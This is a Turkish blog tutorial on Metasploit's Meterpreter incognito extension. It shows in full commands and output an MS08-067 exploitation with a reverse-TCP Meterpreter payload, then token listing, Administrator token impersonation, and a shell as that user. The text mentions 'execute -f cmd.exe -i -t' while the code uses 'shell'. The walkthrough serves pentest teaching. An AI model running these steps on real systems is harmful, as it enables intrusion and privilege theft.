---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:24:00Z"
excerpt: Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait token adı
  verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında
  kullanılan cookie denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise
  (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum
  açıldığında sistem bu kullanıcıya bir token tanımlar. Artık bilgisayar kapanana
  kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır.
guid: https://www.siberoloji.com/?p=1183
id: 1183
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Incognito
url: /tr/msf-incognito/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="incognito-nedir">Incognito Nedir? 
<!-- /wp:heading -->

  Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait&nbsp;<strong>token</strong>&nbsp;adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan&nbsp;<strong>cookie</strong>&nbsp;denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir&nbsp;<strong>token</strong>&nbsp;tanımlar. Artık bilgisayar kapanana kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır.</p>
 

  Pentest işlemleri esnasında bu&nbsp;<strong>token</strong>&nbsp;ve yetkilerini ele geçirerek kullanmaya&nbsp;<strong>incognito</strong>&nbsp;işlemi denilmektedir.&nbsp;<strong>token</strong>&nbsp;izinleri, ikiye ayrılmaktadır. Bunlara&nbsp;<strong>delegate</strong>&nbsp;ve&nbsp;<strong>impersonate</strong>&nbsp;adı verilmektedir. Okuyucunun kafasının karışmaması için biz de İngilizce şekillerini kullanmaya devam edeceğiz.</p>
 

  Delegate: token izinleri beyan ediciler olarak kullanılır. Etkileşimli oturumlarda, örneğin uzak masaüstü bağlantıları tarzında işlemler için kullanılırlar.</p>
 

  Impersonate: token izinleri kişisel olarak üretilmiş izinlerdir ve etkileşim olmayan servisler için kullanılırlar. Örneğin bir ağ klasörüne bağlanmak gibi.</p>
 

<!-- wp:quote -->
<blockquote class="wp-block-quote">  Dosya sunucuları bu token izinleri için çok zengin bir bilgi kaynağıdırlar.</p>
 </blockquote>
<!-- /wp:quote -->

  Hedef sistemde bir token ele geçirdiğinizde, artık bir servise bağlanmak için o kullanıcının parolasını bilmeye gerek kalmaz çünkü yetkilendirme önceden yapılmıştır ve yetki kontrolü&nbsp;<strong>token</strong>&nbsp;iznine güvenilerek arka planda yapılır. Bir sistemde meterpreter shell açıldığında kullanılabilir durumda olan&nbsp;<strong>token</strong>&nbsp;listesi kontrol edilmelidir.</p>
 

 
<h2 class="wp-block-heading" id="meterpreter-oturum-açalım">Meterpreter Oturum Açalım</h2>
<!-- /wp:heading -->

  Aşağıdaki örnekte, öncelikle&nbsp;<code>ms08_067_netapi</code>&nbsp;modülü kullanılarak gerekli ayarlar yapılmakta ve bir oturum açılmaktadır.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use exploit/windows/smb/ms08_067_netapi
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set RHOST 10.211.55.140
RHOST <strong>=&gt;</strong> 10.211.55.140
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD <strong>=&gt;</strong> windows/meterpreter/reverse_tcp
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set LHOST 10.211.55.162
LHOST <strong>=&gt;</strong> 10.211.55.162
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set LANG english
LANG <strong>=&gt;</strong> english
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> show targets

Exploit targets:

   Id  Name                                               
   --  ----                                               
   0   Automatic Targeting                                
   1   Windows 2000 Universal                             
   2   Windows XP SP0/SP1 Universal                       
   3   Windows XP SP2 English <strong>(</strong>NX<strong>)</strong>                        
   4   Windows XP SP3 English <strong>(</strong>NX<strong>)</strong>                        
   5   Windows 2003 SP0 Universal                         
   6   Windows 2003 SP1 English <strong>(</strong>NO NX<strong>)</strong>                   
   7   Windows 2003 SP1 English <strong>(</strong>NX<strong>)</strong>                      
   8   Windows 2003 SP2 English <strong>(</strong>NO NX<strong>)</strong>                   
   9   Windows 2003 SP2 English <strong>(</strong>NX<strong>)</strong>                      
   10  Windows XP SP2 Arabic <strong>(</strong>NX<strong>)</strong>                         
   11  Windows XP SP2 Chinese - Traditional / Taiwan <strong>(</strong>NX<strong>)</strong> 


msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set TARGET 8
target <strong>=&gt;</strong> 8
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Triggering the vulnerability...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>10.211.55.162:4444 -&gt; 10.211.55.140:1028<strong>)</strong>

meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="incognito-modülünü-yükleyelim">Incognito Modülünü Yükleyelim</h2>
<!-- /wp:heading -->

  Meterpreter oturumu açmayı başardıktan sonra&nbsp;<code>incognito</code>&nbsp;modülünü kullanmamız gerekiyor.&nbsp;<code>Incognito</code>&nbsp;modülü, meterpreter e ait bir modül olduğundan&nbsp;<code>use incognito</code>&nbsp;komutuyla modülü aktif hale getiriyoruz. Ardından&nbsp;<code>help</code>&nbsp;komutunu verdiğinizde,&nbsp;<code>incognito</code>&nbsp;modülüne özel komutları görebiliriz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> use incognito
Loading extension incognito...success.
meterpreter <strong>&gt;</strong> help

Incognito Commands
<strong>==================</strong>

    Command              Description                                             
    -------              -----------                                             
    add_group_user       Attempt to add a user to a global group with all tokens 
    add_localgroup_user  Attempt to add a user to a local group with all tokens  
    add_user             Attempt to add a user with all tokens                   
    impersonate_token    Impersonate specified token                             
    list_tokens          List tokens available under current user context        
    snarf_hashes         Snarf challenge/response hashes <strong>for </strong>every token         

meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="sistemdeki-token-listesi">Sistemdeki token Listesi</h2>
<!-- /wp:heading -->

  Meterpreter içerisinde&nbsp;<code>incognito</code>&nbsp;modülünü yükledikten sonra&nbsp;<code>list_tokens</code>&nbsp;komutuyla listeyi kontrol edelim. Listede bulunan bir takım&nbsp;<strong>token</strong>&nbsp;izinlerine Administrator kullanıcılarının bile erişimi olmayabilir. Bizim en fazla ilgileneceğimiz tür&nbsp;<strong>SYSTEM</strong>&nbsp;token izinleridir.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> list_tokens -u

Delegation Tokens Available
<strong>========================================</strong>
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
<strong>========================================</strong>
NT AUTHORITY\ANONYMOUS LOGON

meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Yukarıda listede bulunan&nbsp;<code>SNEAKS.IN\Administrator</code>&nbsp;isimli token fark ettiyseniz&nbsp;<strong>Delegation</strong>&nbsp;listesinde bulunmaktadır. Bunu&nbsp;<strong>Impersonation</strong>&nbsp;haline getirerek kişiselleştirmeniz gerekmektedir. Bunun için&nbsp;<code>impersonate_token</code>&nbsp;komutunu kullanacağız. Komutu girerken iki adet&nbsp;<code>\\</code>&nbsp;işareti kullanmaya dikkat edin. Listede&nbsp;<code>\</code>&nbsp;tek olsa da komutu girerken iki adet girilmelidir.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> impersonate_token SNEAKS.IN\\Administrator
<strong>[</strong>+] Delegation token available
<strong>[</strong>+] Successfully impersonated user SNEAKS.IN\Administrator
meterpreter <strong>&gt;</strong> getuid
Server username: SNEAKS.IN\Administrator
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Komut başarıyla sonlandığında&nbsp;<code>getuid</code>&nbsp;komutuyla kullanıcı kimliğini kontrol ettiğimizde&nbsp;<code>Server username: SNEAKS.IN\Administrator</code>&nbsp;sonucu aldık.</p>
 

 
<h2 class="wp-block-heading" id="yeni-kullacı-ile-shell-açma">Yeni Kullacı ile Shell Açma</h2>
<!-- /wp:heading -->

  Meterpreter içerisinde&nbsp;<code>execute -f cmd.exe -i -t</code>&nbsp;komutu ile komut satırında oturum açalım ve&nbsp;<code>whoami</code>&nbsp;komutuyla Windows kullanıcı kimliğine bakalım. Burada&nbsp;<code>-i</code>&nbsp;seçeneği&nbsp;<strong>interact</strong>* yani etkileşimli,&nbsp;<code>-t</code>&nbsp;seçeneği ise yeni ele geçirdiğimiz&nbsp;<code>SNEAKS.IN\Administrator</code>&nbsp;token iznini kullanmayı ifade eder.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> shell
Process 2804 created.
Channel 1 created.
Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt; whoami
whoami
SNEAKS.IN\administrator

C:\WINDOWS\system32&gt;
</code></pre>
<!-- /wp:code -->

  Kişisel bilgisayarlarda karşılaşabileceğiniz&nbsp;<strong>token</strong>&nbsp;izinlerine, sunucu bilgisayarlarda daha çok rast gelebilirsiniz. Sunucularda bir çok servis etkileşimli ve çok kullanıcılı olarak çalıştığından liste daha uzun olacaktır. Bunların arasından en çok yetkili&nbsp;<strong>token</strong>&nbsp;izinleri denemelisiniz.</p>
 